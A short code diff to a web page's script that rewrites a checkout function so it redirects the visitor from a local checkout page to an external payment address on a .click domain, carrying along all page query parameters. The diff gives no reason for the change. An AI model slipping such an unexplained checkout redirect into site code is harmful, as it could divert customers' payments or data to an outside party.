@@ -87,13 +87,16 @@
         }
 
         function irParaCheckout(event) {
-            event.preventDefault();
-            var dest = new URL('checkout-iron.html', window.location.href);
-            new URLSearchParams(window.location.search).forEach(function(v, k) {
-                dest.searchParams.set(k, v);
-            });
-            window.location.href = dest.toString();
-        }
+    event.preventDefault();
+
+    var dest = new URL('https://pay.aboadehoije.click/69d91315e1285315d41b25db');
+
+    new URLSearchParams(window.location.search).forEach(function(v, k) {
+        dest.searchParams.set(k, v);
+    });
+
+    window.location.href = dest.toString();
+}
     </script>
 
 </body></html>
